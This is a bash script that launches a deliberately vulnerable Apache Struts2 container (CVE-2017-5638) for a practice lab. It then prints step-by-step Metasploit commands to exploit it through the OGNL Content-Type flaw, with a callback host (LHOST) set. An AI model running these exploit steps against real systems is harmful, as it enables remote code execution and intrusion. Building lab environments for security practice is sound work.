#!/bin/bash

echo "Installation STRUTS2 UNIQUEMENT (rapide et garanti)"

docker stop struts2-vuln 2>/dev/null || true
docker rm struts2-vuln 2>/dev/null || true

docker pull vulnerables/cve-2017-5638

docker run -d \
    --name struts2-vuln \
    -p 8080:8080 \
    vulnerables/cve-2017-5638

sleep 10

IP=$(hostname -I | awk '{print $1}')

echo ""
echo "✅ PRÊT !"
echo ""
docker ps | grep struts2
echo ""
echo "METASPLOIT:"
echo ""
echo "use exploit/multi/http/struts2_content_type_ognl"
echo "set RHOSTS ${IP}"
echo "set RPORT 8080"
echo "set TARGETURI /struts2-showcase/integration/saveGangster.action"
echo "set LHOST 192.168.100.10"
echo "exploit"
echo ""
EOF
